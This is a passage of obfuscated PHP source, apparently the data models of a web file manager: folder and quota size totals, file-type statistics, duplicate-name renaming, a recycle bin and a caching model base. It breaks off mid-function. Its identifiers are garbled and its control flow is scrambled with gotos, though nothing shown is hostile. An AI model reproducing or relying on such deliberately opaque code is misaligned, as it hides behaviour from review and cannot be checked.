$this->sourceInfo($dôç‡’Ç«ó); goto AªÀˆô§µ; AªÀˆô§µ: $Dßò¡œ¬Å½ = array($AÚ™º”°òß[571] => 1, $AÚ™º”°òß[578] => array($AÚ™º”°òß[538], $d¨ÏÕµç‰[$AÚ™º”°òß[515]] . $dôç‡’Ç«ó . $AÚ™º”°òß[539])); $BÊªª”ßáİ = $AÚ™º”°òß[2024]; $f³“¿ñÓ†« = $this->field($BÊªª”ßáİ)->where($Dßò¡œ¬Å½)->select(); goto CÊ­¢˜ø£—; aõÖãÕ°‹Ï: $f³“¿ñÓ†«[] = $d¨ÏÕµç‰; $f³“¿ñÓ†« = array_to_keyvalue($f³“¿ñÓ†«, $AÚ™º”°òß[397]); foreach ($f³“¿ñÓ†« as $f‘Â‚¨ñˆ => $E¢ßİÍÕ­½) { $f³“¿ñÓ†«[$f‘Â‚¨ñˆ][$AÚ™º”°òß[2025]] = $f³“¿ñÓ†«[$f‘Â‚¨ñˆ][$AÚ™º”°òß[78]]; $f³“¿ñÓ†«[$f‘Â‚¨ñˆ][$AÚ™º”°òß[78]] = 0; } goto BÚÕ¹¡ë®„; CÊ­¢˜ø£—: $Dßò¡œ¬Å½[$AÚ™º”°òß[405]] = 0; $Eí‹”ÙÙ·‚ = $this->field($BÊªª”ßáİ)->where($Dßò¡œ¬Å½)->select(); if (!$Eí‹”ÙÙ·‚) { return; } goto aõÖãÕ°‹Ï; BÚÕ¹¡ë®„: foreach ($Eí‹”ÙÙ·‚ as $E¢ßİÍÕ­½) { $A¿²”øÃ„ = $E¢ßİÍÕ­½[$AÚ™º”°òß[492]] . $AÚ™º”°òß[33]; if (!isset($f³“¿ñÓ†«[$A¿²”øÃ„])) { continue; } if ($E¢ßİÍÕ­½[$AÚ™º”°òß[425]] == $f³“¿ñÓ†«[$A¿²”øÃ„][$AÚ™º”°òß[425]]) { $f³“¿ñÓ†«[$A¿²”øÃ„][$AÚ™º”°òß[78]] += $E¢ßİÍÕ­½[$AÚ™º”°òß[78]]; } } foreach ($f³“¿ñÓ†« as $E¢ßİÍÕ­½) { $E«„†ô¹ñœ = $this->parentLevelArray($E¢ßİÍÕ­½[$AÚ™º”°òß[515]]); foreach ($E«„†ô¹ñœ as $A¿²”øÃ„) { $A¿²”øÃ„ = $A¿²”øÃ„ . $AÚ™º”°òß[33]; if (!isset($f³“¿ñÓ†«[$A¿²”øÃ„])) { continue; } if ($E¢ßİÍÕ­½[$AÚ™º”°òß[425]] == $f³“¿ñÓ†«[$A¿²”øÃ„][$AÚ™º”°òß[425]]) { $f³“¿ñÓ†«[$A¿²”øÃ„][$AÚ™º”°òß[78]] += $E¢ßİÍÕ­½[$AÚ™º”°òß[78]]; } } } $d—õƒ´’¥ = array(); goto BÎ»ˆ¡÷ï‡; F´ÔŠ¢ì¡œ: } public function userSpaceReset($B„¼íç µÃ = false) { $bî„ò¦íõº =& $_SERVER[›é¼±]; $aÏŒùÎß = $this->where(array($bî„ò¦íõº[406] => self::TYPE_USER, $bî„ò¦íõº[498] => $B„¼íç µÃ, $bî„ò¦íõº[405] => 0))->sum($bî„ò¦íõº[78]); $aÏŒùÎß = !$aÏŒùÎß || $aÏŒùÎß <= 0 ? 0 : $aÏŒùÎß; Model($bî„ò¦íõº[507])->userEdit($B„¼íç µÃ, array($bî„ò¦íõº[1719] => $aÏŒùÎß)); } public function targetSpaceUpdate($E‹áõ¨àÌ›, $B±¼öƒ÷) { $fé ƒ¼Ş™ =& $_SERVER[›é¼±]; if (!$B±¼öƒ÷) { return; } if (!in_array($E‹áõ¨àÌ›, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $Bé‡Öä°Ù¨ = $this->targetSpaceSize($E‹áõ¨àÌ›, $B±¼öƒ÷); if ($E‹áõ¨àÌ› == self::TYPE_USER) { Model($fé ƒ¼Ş™[507])->userEdit($B±¼öƒ÷, array($fé ƒ¼Ş™[1719] => $Bé‡Öä°Ù¨)); } else { if ($E‹áõ¨àÌ› == self::TYPE_GROUP) { Model($fé ƒ¼Ş™[516])->groupEdit($B±¼öƒ÷, array($fé ƒ¼Ş™[1719] => $Bé‡Öä°Ù¨)); } } } public function targetSpaceSize($B™…İÀğ, $EÓò›•¬Ôƒ) { goto AÃåÔê±ä; B¶¿§çà : $c£œŒ…Ÿ÷Ó = !$c£œŒ…Ÿ÷Ó || $c£œŒ…Ÿ÷Ó <= 0 ? 0 : $c£œŒ…Ÿ÷Ó; return $c£œŒ…Ÿ÷Ó; goto D¢„ôæöäŸ; AÃåÔê±ä: $f«ğÏ¦»ïÏ =& $_SERVER[›é¼±]; $AŒ»ã…é­Œ = $this->sourceRoot($B™…İÀğ, $EÓò›•¬Ôƒ, !0); if (!$AŒ»ã…é­Œ) { return 0; } goto c·õ½ÛŠÆÊ; f®®É×Öˆ: $D›©ˆ÷âİÄ = array_to_keyvalue($D›©ˆ÷âİÄ, $f«ğÏ¦»ïÏ[33], $f«ğÏ¦»ïÏ[397]); $D›©ˆ÷âİÄ = array_unique(array_filter($D›©ˆ÷âİÄ)); if ($D›©ˆ÷âİÄ) { $bÂŒ¥§ø’ = array($f«ğÏ¦»ïÏ[412] => array($f«ğÏ¦»ïÏ[413], $D›©ˆ÷âİÄ)); $c£œŒ…Ÿ÷Ó += floatval($this->where($bÂŒ¥§ø’)->sum($f«ğÏ¦»ïÏ[78])); } goto B¶¿§çà ; c·õ½ÛŠÆÊ: $c£œŒ…Ÿ÷Ó = floatval($AŒ»ã…é­Œ[$f«ğÏ¦»ïÏ[78]]); $bÂŒ¥§ø’ = array($f«ğÏ¦»ïÏ[578] => array($f«ğÏ¦»ïÏ[538], $f«ğÏ¦»ïÏ[525] . $AŒ»ã…é­Œ[$f«ğÏ¦»ïÏ[397]] . $f«ğÏ¦»ïÏ[539])); $D›©ˆ÷âİÄ = Model($f«ğÏ¦»ïÏ[423])->field($f«ğÏ¦»ïÏ[412])->where($bÂŒ¥§ø’)->select(); goto f®®É×Öˆ; D¢„ôæöäŸ: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($aó†¾Œ­³) { return $this->fileTypeProfile($aó†¾Œ­³, SourceModel::TYPE_USER); } public function groupFileTypeProfile($DÁ®§£ƒâ) { return $this->fileTypeProfile($DÁ®§£ƒâ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($D¬­ÎÏ‚†«, $A¬øÈÂø”) { goto b¢¯Š³Ùò‡; D¦É…ò¯ŠÇ: $b×º²²ÊŞ® = array(); $b×º²²ÊŞ®[$A‚‘…Ø´ˆñ[2027]] = array($A‚‘…Ø´ˆñ[2028] => LNG($A‚‘…Ø´ˆñ[2027]), $A‚‘…Ø´ˆñ[2029] => $this->where($DˆÊÆ‘—ÄÓ)->count(), $A‚‘…Ø´ˆñ[573] => $this->where($DˆÊÆ‘—ÄÓ)->sum($A‚‘…Ø´ˆñ[78])); $BÁ»§¶Şà = KodIO::fileTypeList(); goto d¯…ùÄáÓ”; b¢¯Š³Ùò‡: $A‚‘…Ø´ˆñ =& $_SERVER[›é¼±]; $dÁÓ¸ƒÖÏ = $A‚‘…Ø´ˆñ[2026] . $D¬­ÎÏ‚†« . $A‚‘…Ø´ˆñ[71] . $A¬øÈÂø”; $EË‚’íå… = Cache::get($dÁÓ¸ƒÖÏ); goto BË‘óóŠŒŒ; BË‘óóŠŒŒ: if ($EË‚’íå…) { return $EË‚’íå…; } $DˆÊÆ‘—ÄÓ = array($A‚‘…Ø´ˆñ[571] => 0); if ($D¬­ÎÏ‚†« != !1) { $DˆÊÆ‘—ÄÓ[$A‚‘…Ø´ˆñ[498]] = $D¬­ÎÏ‚†«; $DˆÊÆ‘—ÄÓ[$A‚‘…Ø´ˆñ[406]] = $A¬øÈÂø”; } goto D¦É…ò¯ŠÇ; d¯…ùÄáÓ”: foreach ($BÁ»§¶Şà as $a³©—ƒ·‚­ => $bÓå¢¯œ¥¦) { $DˆÊÆ‘—ÄÓ[$A‚‘…Ø´ˆñ[407]] = $this->fileTypeWhere($a³©—ƒ·‚­); $b×º²²ÊŞ®[$a³©—ƒ·‚­] = array($A‚‘…Ø´ˆñ[2028] => $bÓå¢¯œ¥¦[$A‚‘…Ø´ˆñ[28]], $A‚‘…Ø´ˆñ[2029] => $this->where($DˆÊÆ‘—ÄÓ)->count(), $A‚‘…Ø´ˆñ[573] => $this->where($DˆÊÆ‘—ÄÓ)->sum($A‚‘…Ø´ˆñ[78])); } Cache::set($dÁÓ¸ƒÖÏ, $b×º²²ÊŞ®, 1200); return $b×º²²ÊŞ®; goto bœ¬âˆ‚÷Å; bœ¬âˆ‚÷Å: } public function fileNameExist($D«Ü²ÛÓôğ, $bÅŠöµç–ğ) { $B‚Ğ©Ôğø« =& $_SERVER[›é¼±]; $b²áË‚³ = $this->where(array($B‚Ğ©Ôğø«[492] => $D«Ü²ÛÓôğ, $B‚Ğ©Ôğø«[28] => $bÅŠöµç–ğ, $B‚Ğ©Ôğø«[425] => 0))->find(); return is_array($b²áË‚³) ? $b²áË‚³[$B‚Ğ©Ôğø«[397]] : !1; } public function childList($eß„æŒáĞÆ) { goto DòÇÆ‡Úïµ; Aì‘¯¡ö¸ù: $EÆñ¹®Ê¹è = array($C¶ó¿Ä£Ú¨[492] => intval($eß„æŒáĞÆ), $C¶ó¿Ä£Ú¨[425] => 0); $CÉœíƒÈ = $this->where($EÆñ¹®Ê¹è)->select(); $CÉœíƒÈ = $CÉœíƒÈ ? $CÉœíƒÈ : array(); goto C£‰ƒç; C£‰ƒç: self::$cacheChildList[$BˆŠ¢ĞÒøé] = $CÉœíƒÈ; foreach ($CÉœíƒÈ as $fÚãœŒ•¨‚) { $BˆŠ¢ĞÒøé = $C¶ó¿Ä£Ú¨[452] . $fÚãœŒ•¨‚[$C¶ó¿Ä£Ú¨[397]]; self::$cacheSourceInfo[$BˆŠ¢ĞÒøé] = $fÚãœŒ•¨‚; } return $CÉœíƒÈ; goto B‹‹ò¯Ù†³; DòÇÆ‡Úïµ: $C¶ó¿Ä£Ú¨ =& $_SERVER[›é¼±]; $BˆŠ¢ĞÒøé = $C¶ó¿Ä£Ú¨[2004] . $eß„æŒáĞÆ; if (isset(self::$cacheChildList[$BˆŠ¢ĞÒøé])) { return self::$cacheChildList[$BˆŠ¢ĞÒøé]; } goto Aì‘¯¡ö¸ù; B‹‹ò¯Ù†³: } public function fileNameAuto($FÓƒ¬Ë”“ò, $b¬ÍóîÍ, $c”²ØùªÎ™ = REPEAT_RENAME, $AÈñ©·± = false) { $e‡Å×¬±ˆå =& $_SERVER[›é¼±]; $Eîà‹™éÛ = array($e‡Å×¬±ˆå[492] => $FÓƒ¬Ë”“ò, $e‡Å×¬±ˆå[425] => 0, $e‡Å×¬±ˆå[28] => array($e‡Å×¬±ˆå[381], $b¬ÍóîÍ . $e‡Å×¬±ˆå[382])); $Eˆ³Ü¦Û°× = $this->field($e‡Å×¬±ˆå[28])->where($Eîà‹™éÛ)->select(); $D“áèà©¹ = array_to_keyvalue($Eˆ³Ü¦Û°×, $e‡Å×¬±ˆå[33], $e‡Å×¬±ˆå[28]); return $this->fileNameAutoGet($D“áèà©¹, $b¬ÍóîÍ, $c”²ØùªÎ™, $AÈñ©·±); } public function fileNameAutoGet($A´¶œ¸ßªõ, $b†ÆáÜ©ö†, $CªÌİĞ¢¨, $AÙ™è±õĞê) { $dØÏ ö‚ö‰ =& $_SERVER[›é¼±]; if ($CªÌİĞ¢¨ == REPEAT_REPLACE || !$A´¶œ¸ßªõ || !in_array_not_case($b†ÆáÜ©ö†, $A´¶œ¸ßªõ) || $AÙ™è±õĞê && $CªÌİĞ¢¨ != REPEAT_RENAME_FOLDER) { return $b†ÆáÜ©ö†; } if ($CªÌİĞ¢¨ == REPEAT_SKIP) { return !1; } $d¨‚¾ÖÍ÷ = $dØÏ ö‚ö‰[95] . get_path_ext($b†ÆáÜ©ö†); $d¨‚¾ÖÍ÷ = $d¨‚¾ÖÍ÷ == $dØÏ ö‚ö‰[95] || $AÙ™è±õĞê ? $dØÏ ö‚ö‰[33] : $d¨‚¾ÖÍ÷; for ($eÍõÈ×Ì¼Ô = 1; $eÍõÈ×Ì¼Ô <= count($A´¶œ¸ßªõ) + 1; $eÍõÈ×Ì¼Ô++) { $B½ÎÆÓ‰“· = substr($b†ÆáÜ©ö†, 0, strlen($b†ÆáÜ©ö†) - strlen($d¨‚¾ÖÍ÷)); $F®Ú‘•ÀŒÍ = $B½ÎÆÓ‰“· . "\50{$eÍõÈ×Ì¼Ô}\51{$d¨‚¾ÖÍ÷}"; if (!in_array_not_case($F®Ú‘•ÀŒÍ, $A´¶œ¸ßªõ)) { return $F®Ú‘•ÀŒÍ; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\x6f\165\162\143\145\x5f\x72\145\143\x79\143\x6c\145"; protected $dataAuto = array(array("\x63\162\145\141\164\145\x54\151\x6d\x65", "\x74\x69\155\145", "\x69\x6e\x73\x65\162\164", "\146\x75\156\143\x74\x69\157\156")); public function listData($E¡å¿¬ğÚ = false) { $bçÅéÉª© =& $_SERVER[›é¼±]; $E¡å¿¬ğÚ = $E¡å¿¬ğÚ ? $E¡å¿¬ğÚ : USER_ID; $eÉì»ÄÆ‘Î = $this->where(array($bçÅéÉª©[1555] => $E¡å¿¬ğÚ))->select(); return array_to_keyvalue($eÉì»ÄÆ‘Î, $bçÅéÉª©[33], $bçÅéÉª©[397]); } public function moveToRecycle($AØ˜¬Ÿ†¯Ó) { goto A†å‚èÍˆ‰; cÒå– Ç: if (!$Eë–µé©Ø¸ || $Eë–µé©Ø¸[$d«÷†à‹‘Ø[425]] == $d«÷†à‹‘Ø[87]) { return; } $f²²É‘°ª = array($d«÷†à‹‘Ø[412] => $AØ˜¬Ÿ†¯Ó, $d«÷†à‹‘Ø[1555] => USER_ID, $d«÷†à‹‘Ø[574] => $Eë–µé©Ø¸[$d«÷†à‹‘Ø[406]], $d«÷†à‹‘Ø[575] => $Eë–µé©Ø¸[$d«÷†à‹‘Ø[498]], $d«÷†à‹‘Ø[578] => $Eë–µé©Ø¸[$d«÷†à‹‘Ø[515]]); $this->add($f²²É‘°ª); goto b¾êèÆµ®ô; b¾êèÆµ®ô: $this->recycleMove($AØ˜¬Ÿ†¯Ó, 1); if ($Eë–µé©Ø¸[$d«÷†à‹‘Ø[405]] == $d«÷†à‹‘Ø[87]) { $bÌéò¾…­ = array($d«÷†à‹‘Ø[578] => array($d«÷†à‹‘Ø[538], $Eë–µé©Ø¸[$d«÷†à‹‘Ø[515]] . $AØ˜¬Ÿ†¯Ó . $d«÷†à‹‘Ø[539])); $E¾“Şé¾Á¼->where($bÌéò¾…­)->setField($d«÷†à‹‘Ø[425], 1); } goto A‘¬µ¨”é; A†å‚èÍˆ‰: $d«÷†à‹‘Ø =& $_SERVER[›é¼±]; $E¾“Şé¾Á¼ = Model($d«÷†à‹‘Ø[1239]); $Eë–µé©Ø¸ = $E¾“Şé¾Á¼->sourceInfo($AØ˜¬Ÿ†¯Ó); goto cÒå– Ç; A‘¬µ¨”é: } public function clear() { $this->remove(!1); } public function remove($e­éÊÄ†ÉË = false, $B‚ŞÆÅÛ = false) { goto DßĞ›àˆ¤; AÕÖ³‹Ê¶: foreach ($dõ‚øÙã°À as $E»ÏæÂôøñ) { if ($e­éÊÄ†ÉË != !1 && !in_array($E»ÏæÂôøñ, $e­éÊÄ†ÉË)) { continue; } $C¢ååáò¢ª = $E‡´ ‹¥È™->sourceInfo($E»ÏæÂôøñ); $E‡´ ‹¥È™->remove($E»ÏæÂôøñ, !1); $BÔ’ÁâŸ·ß = $C¢ååáò¢ª[$dÏï³ÍÇ„Ş[406]] . $dÏï³ÍÇ„Ş[71] . $C¢ååáò¢ª[$dÏï³ÍÇ„Ş[498]]; $F×…Å¯‡ˆ˜[$BÔ’ÁâŸ·ß] = array($dÏï³ÍÇ„Ş[574] => $C¢ååáò¢ª[$dÏï³ÍÇ„Ş[406]], $dÏï³ÍÇ„Ş[498] => $C¢ååáò¢ª[$dÏï³ÍÇ„Ş[498]]); $this->where(array($dÏï³ÍÇ„Ş[397] => $E»ÏæÂôøñ))->delete(); } foreach ($F×…Å¯‡ˆ˜ as $E”¦Í¨³§ö) { $E‡´ ‹¥È™->targetSpaceUpdate($E”¦Í¨³§ö[$dÏï³ÍÇ„Ş[406]], $E”¦Í¨³§ö[$dÏï³ÍÇ„Ş[498]]); } goto Eçê¥Ê…ÚÚ; DßĞ›àˆ¤: $dÏï³ÍÇ„Ş =& $_SERVER[›é¼±]; $B‚ŞÆÅÛ = $B‚ŞÆÅÛ ? $B‚ŞÆÅÛ : USER_ID; $E‡´ ‹¥È™ = Model($dÏï³ÍÇ„Ş[1239]); goto dÒ±Š¸øä; dÒ±Š¸øä: $dõ‚øÙã°À = $this->listData($B‚ŞÆÅÛ); $e­éÊÄ†ÉË = $e­éÊÄ†ÉË === !1 ? !1 : $e­éÊÄ†ÉË; $F×…Å¯‡ˆ˜ = array(); goto AÕÖ³‹Ê¶; Eçê¥Ê…ÚÚ: } public function restore($E˜·êÔ²Ç† = false) { $Eµ¼¨ÖØ–† = $this->listData(); $this->_restoreSource($Eµ¼¨ÖØ–†, $E˜·êÔ²Ç†); } public function removeUserAll($C’Ç®¦šÅ‡) { $this->remove(!1, $C’Ç®¦šÅ‡); } private function _restoreSource($D÷Ñ©†¨¶, $dïô†µæ) { goto CòÀ‚ª–ñò; c‡ª¹¾îì: if (!$D÷Ñ©†¨¶) { return !0; } $c¾…Ïê† = array(); foreach ($D÷Ñ©†¨¶ as $bÂ£‡’—à¤) { goto aŸ›ĞÆÚ; fˆÖ‘¿“Í: if ($eå¦š‰ù‚Á[$fâÜÇš¿Ù[425]] == $fâÜÇš¿Ù[87]) { continue; } $DÔ…ÅÂÀ•©->lockMoveStart($bÂ£‡’—à¤); $this->recycleMove($bÂ£‡’—à¤, 0); goto Fá¤‡†™í°; a·¿Å¯Õò÷: $c¾…Ïê†[] = $c¨œÂˆã¶Ø[$fâÜÇš¿Ù[492]]; if ($c¨œÂˆã¶Ø[$fâÜÇš¿Ù[405]] == $fâÜÇš¿Ù[87]) { $c¾…Ïê†[] = $bÂ£‡’—à¤; } $DÔ…ÅÂÀ•©->lockMoveEnd($bÂ£‡’—à¤); goto AÜÚŠóÑ‡; aŸ›ĞÆÚ: if ($dïô†µæ != !1 && !in_array($bÂ£‡’—à¤, $dïô†µæ)) { continue; } $c¨œÂˆã¶Ø = $DÔ…ÅÂÀ•©->sourceInfo($bÂ£‡’—à¤); $eå¦š‰ù‚Á = $DÔ…ÅÂÀ•©->sourceInfo($c¨œÂˆã¶Ø[$fâÜÇš¿Ù[492]]); goto fˆÖ‘¿“Í; Fá¤‡†™í°: if ($c¨œÂˆã¶Ø[$fâÜÇš¿Ù[405]] == $fâÜÇš¿Ù[87]) { $CÒ»ªÀ– = array($fâÜÇš¿Ù[578] => array($fâÜÇš¿Ù[538], $c¨œÂˆã¶Ø[$fâÜÇš¿Ù[515]] . $bÂ£‡’—à¤ . $fâÜÇš¿Ù[539])); $DÔ…ÅÂÀ•©->where($CÒ»ªÀ–)->setField($fâÜÇš¿Ù[425], 0); $this->restoreFolderChildren($bÂ£‡’—à¤, $D÷Ñ©†¨¶); } $this->where(array($fâÜÇš¿Ù[397] => $bÂ£‡’—à¤))->delete(); $DÔ…ÅÂÀ•©->folderSizeReset($c¨œÂˆã¶Ø[$fâÜÇš¿Ù[492]]); goto a·¿Å¯Õò÷; AÜÚŠóÑ‡: } goto bÆ‹Å”¥ŸÀ; bÆ‹Å”¥ŸÀ: $DÔ…ÅÂÀ•©->updateModifyTime($c¾…Ïê†); goto Eğ·°È®ßˆ; CòÀ‚ª–ñò: $fâÜÇš¿Ù =& $_SERVER[›é¼±]; $DÔ…ÅÂÀ•© = Model($fâÜÇš¿Ù[1239]); $dïô†µæ = $dïô†µæ == !1 ? !1 : $dïô†µæ; goto c‡ª¹¾îì; Eğ·°È®ßˆ: } private function restoreFolderChildren($a’—³ˆ„‚ò, $FË…¿˜äÔ) { goto F’òêì‚ƒÙ; AÔ˜÷ÄĞ¨: $b²°ï¦‘¹×[$dëìö¬òçµ[397]][1] = array_unique($b²°ï¦‘¹×[$dëìö¬òçµ[397]][1]); $b²°ï¦‘¹×[$dëìö¬òçµ[992]] = $dëìö¬òçµ[1825]; $A‹Æ ±†ˆß->where($b²°ï¦‘¹×)->setField($dëìö¬òçµ[425], 1); goto A‹”Š›×‡Ë; e’èËÄöÃğ: foreach ($FË…¿˜äÔ as $BØÖø„¦Ó‹) { if ($BØÖø„¦Ó‹ == $a’—³ˆ„‚ò) { continue; } if (!$A‹Æ ±†ˆß->isParentOf($a’—³ˆ„‚ò, $BØÖø„¦Ó‹)) { continue; } $a â©³Ô“ = $A‹Æ ±†ˆß->sourceInfo($BØÖø„¦Ó‹); if ($a â©³Ô“[$dëìö¬òçµ[405]] == $dëìö¬òçµ[87]) { $b²°ï¦‘¹×[] = array($dëìö¬òçµ[578] => array($dëìö¬òçµ[538], $a â©³Ô“[$dëìö¬òçµ[515]] . $BØÖø„¦Ó‹ . $dëìö¬òçµ[539])); } else { $b²°ï¦‘¹×[$dëìö¬òçµ[397]][1][] = $BØÖø„¦Ó‹; } } if (!$b²°ï¦‘¹×[$dëìö¬òçµ[397]][1]) { unset($b²°ï¦‘¹×[$dëìö¬òçµ[397]]); } if (!$b²°ï¦‘¹×) { return; } goto AÔ˜÷ÄĞ¨; F’òêì‚ƒÙ: $dëìö¬òçµ =& $_SERVER[›é¼±]; $A‹Æ ±†ˆß = Model($dëìö¬òçµ[1239]); $b²°ï¦‘¹× = array($dëìö¬òçµ[397] => array($dëìö¬òçµ[7], array())); goto e’èËÄöÃğ; A‹”Š›×‡Ë: } private function recycleMove($d‡ÅÁêŠÊª, $E©Àå›°ç = 1) { $Bôö¾ªë…Í =& $_SERVER[›é¼±]; $AŞ¡½ÂŠ•¼ = Model($Bôö¾ªë…Í[1239]); $f¼ÜöÚ”Ö = Model($Bôö¾ªë…Í[2030]); $Dº‡ÂÔš = array($Bôö¾ªë…Í[397] => $d‡ÅÁêŠÊª); if ($E©Àå›°ç) { $AŞ¡½ÂŠ•¼->where($Dº‡ÂÔš)->setField($Bôö¾ªë…Í[425], 1); $f¼ÜöÚ”Ö->eventRecycle($d‡ÅÁêŠÊª, $Bôö¾ªë…Í[2031]); } else { $DëïËÃ¿µ = $AŞ¡½ÂŠ•¼->where($Dº‡ÂÔš)->find(); $BƒÁ†ğ‚ï = $DëïËÃ¿µ[$Bôö¾ªë…Í[405]] == $Bôö¾ªë…Í[87]; $DÜË¤˜ŞÉ§ = $AŞ¡½ÂŠ•¼->fileNameAuto($DëïËÃ¿µ[$Bôö¾ªë…Í[492]], $DëïËÃ¿µ[$Bôö¾ªë…Í[28]], REPEAT_RENAME_FOLDER, $BƒÁ†ğ‚ï); if ($DÜË¤˜ŞÉ§ != $DëïËÃ¿µ[$Bôö¾ªë…Í[28]]) { $AŞ¡½ÂŠ•¼->rename($d‡ÅÁêŠÊª, $DÜË¤˜ŞÉ§); } $AŞ¡½ÂŠ•¼->where($Dº‡ÂÔš)->setField($Bôö¾ªë…Í[425], 0); $f¼ÜöÚ”Ö->eventRecycle($d‡ÅÁêŠÊª, $Bôö¾ªë…Í[2032]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\155\x2e\163\x6f\x75\x72\x63\145\123\x65\x63\x72\x65\164\x4c\x69\x73\x74"; public $field = array("\163\x6f\x75\x72\143\x65\111\x44", "\x74\171\x70\145\111\104", "\x63\162\x65\x61\164\145\x55\x73\x65\x72"); } goto e–’È—ñàò; a¼ì­÷§Œ: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\x64\151\146\x79\x54\151\155\145", "\164\151\155\145", "\151\x6e\163\145\x72\x74\54\x75\160\144\141\164\x65", "\146\x75\156\143\164\x69\x6f\x6e"), array("\143\x72\x65\141\x74\x65\124\x69\x6d\145", "\x74\151\x6d\145", "\151\x6e\x73\145\162\164", "\146\x75\x6e\143\164\151\x6f\156")); public function setDataAuto($b§ìÁ‰¶ø) { $this->dataAuto = $b§ìÁ‰¶ø; } public function __construct($F×£âìë¨ = '', $D³ÊÜíÇƒ† = '', $Fë¢¿¸‚æ = '') { parent::__construct($F×£âìë¨, $D³ÊÜíÇƒ†, $Fë¢¿¸‚æ); } protected $tableMeta = array(); protected function _beforeInsert(&$B±…©‡§—Œ, $d§ÕÊÂÒ¢) { $BêèèÍÖ£  =& $_SERVER[›é¼±]; if (!$this->checkDataAutoHas($BêèèÍÖ£ [353])) { return; } $this->dataBeforeFilter($B±…©‡§—Œ, $BêèèÍÖ£ [353]); } protected function _beforeUpdate(&$eÏ•íÜŞîê, $BßòŠŸÒ) { $eÃÓ«›ç§Ì =& $_SERVER[›é¼±]; if (!$this->checkDataAutoHas($eÃÓ«›ç§Ì[354])) { return; } $this->dataBeforeFilter($eÏ•íÜŞîê, $eÃÓ«›ç§Ì[354]); } protected function _afterSelect(&$Eù‹÷†Å÷ , $a©î¿ÒÀÔõ) { if (!is_array($Eù‹÷†Å÷ )) { return; } if (!$this->checkDataAutoHas($_SERVER[›é¼±][355])) { return; } foreach ($Eù‹÷†Å÷  as &$aİñ×¶¬Âˆ) { $this->dataAfterFilter($aİñ×¶¬Âˆ); } unset($aİñ×¶¬Âˆ); } protected function _afterFind(&$aÎñÃÎ¦, $cÛ©ÊëÏÔ) { if (!is_array($aÎñÃÎ¦)) { return; } if (!$this->checkDataAutoHas($_SERVER[›é¼±][355])) { return; } $this->dataAfterFilter($aÎñÃÎ¦); } public static function textEncode($d²ŸëÑ¹–) { if (!$d²ŸëÑ¹–) { return $d²ŸëÑ¹–; } $Dô¡»œò¹— = json_encode($d²ŸëÑ¹–); $Dô¡»œò¹— = preg_replace_callback($_SERVER[›é¼±][356], function ($D·è¤ù²óµ) { return addslashes($D·è¤ù²óµ[0]); }, $Dô¡»œò¹—); return json_decode($Dô¡»œò¹—); } public static function textDecode($f­½Ìƒ±è) { $bÔÅÒÓğÄœ =& $_SERVER[›é¼±]; $C£ß²ª¢Õ÷ = json_encode($f­½Ìƒ±è); $C£ß²ª¢Õ÷ = preg_replace_callback($bÔÅÒÓğÄœ[357], function ($B÷¬êÍ´ï) { return $_SERVER[›é¼±][97]; }, $C£ß²ª¢Õ÷); return json_decode($C£ß²ª¢Õ÷); } public function setAutoIncrement($bÉÆÖÂšÕÖ) { $A’«š„ñ = array($this->getPk() => $bÉÆÖÂšÕÖ); $AÚ˜‹¤¼îË = $this->data($A’«š„ñ)->add(); if ($AÚ˜‹¤¼îË) { $this->delete($AÚ˜‹¤¼îË); } } public function getAutoIncrement() { $AŠä ÷‡Î¿ = $this->getTableName(); $c„ÛçÈ–ÏÜ = $this->max($this->getPk()); $a¥À¸¯ƒÒİ = $this->query("\x73\x68\157\x77\40\164\x61\x62\x6c\x65\40\163\164\x61\164\165\163\40\x77\x68\x65\162\145\x20\x4e\x61\155\x65\75\47{$AŠä ÷‡Î¿}\47"); $Cùé‚Şòš™ = $a¥À¸¯ƒÒİ[0][$_SERVER[›é¼±][358]]; $b»¤·ˆ¢² = max($c„ÛçÈ–ÏÜ, $Cùé‚Şòš™); return $b»¤·ˆ¢²; } protected function _callBefore($Fó¼ÍôôõÕ, $cÇ‚ƒÜª‡Î) { return $this->cacheCallCheck($Fó¼ÍôôõÕ, $cÇ‚ƒÜª‡Î, !1); } protected function _callAfter($dØôğ±·¨ë, $B¾ã±¸Ì) { return $this->cacheCallCheck($dØôğ±·¨ë, $B¾ã±¸Ì, !0); } protected function cacheFunctionAlias($dÕ¼šæ”“) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($DÂ‚ÁÙ°—™, $d¹ µ¶óœ, $dˆÈåíÄ™Ÿ = false) { $e™œÓ‹„È¶ = $this->cacheFunctionAlias($d¹ µ¶óœ); if (!$e™œÓ‹„È¶) { return; } foreach ($e™œÓ‹„È¶ as $dñƒâæÎŒŸ => $Dêö¡–ò·‰) { $E»òÕÃÇ = $Dêö¡–ò·‰[0]; $eêÁÙŸõºÛ = explode($_SERVER[›é¼±][47], $Dêö¡–ò·‰[1]); if ($DÂ‚ÁÙ°—™ == $dñƒâæÎŒŸ) { return $this->cacheFunctionGet($dñƒâæÎŒŸ, $E»òÕÃÇ); } if ($dˆÈåíÄ™Ÿ && in_array($DÂ‚ÁÙ°—™, $eêÁÙŸõºÛ)) { $this->cacheFunctionClear($dñƒâæÎŒŸ, $E»òÕÃÇ); } } } public function cacheFunctionGet($dÏñ„‚°², $fåìŠëÖïì) { $EÆˆÁŞù“Ù = $this->cacheKeyMake($dÏñ„‚°², $fåìŠëÖïì); $f½¥ÈÅß·» = Cache::get($EÆˆÁŞù“Ù); if (!is_array($f½¥ÈÅß·»)) { $f½¥ÈÅß·» = call_user_func_array(array($this, $dÏñ„‚°²), array($fåìŠëÖïì, !0)); Cache::set($EÆˆÁŞù“Ù, $f½¥ÈÅß·»); } return $f½¥ÈÅß·»; } public function cacheFunctionClear($fçãŠ·Å, $cè ÷×È¥¤) { $eÌÄ•·Ù‘ƒ = $cè ÷×È¥¤; if (!is_array($cè ÷×È¥¤)) { $eÌÄ•·Ù‘ƒ = array($cè ÷×È¥¤); } foreach ($eÌÄ•·Ù‘ƒ as $BĞÃ÷¡‹’Ÿ) { $C‰ò¨¥šŒŒ = $this->cacheKeyMake($fçãŠ·Å, $BĞÃ÷¡‹’Ÿ); Cache::remove($C‰ò¨¥šŒŒ); } } private function cacheKeyMake($bÚˆ§ğªò”, 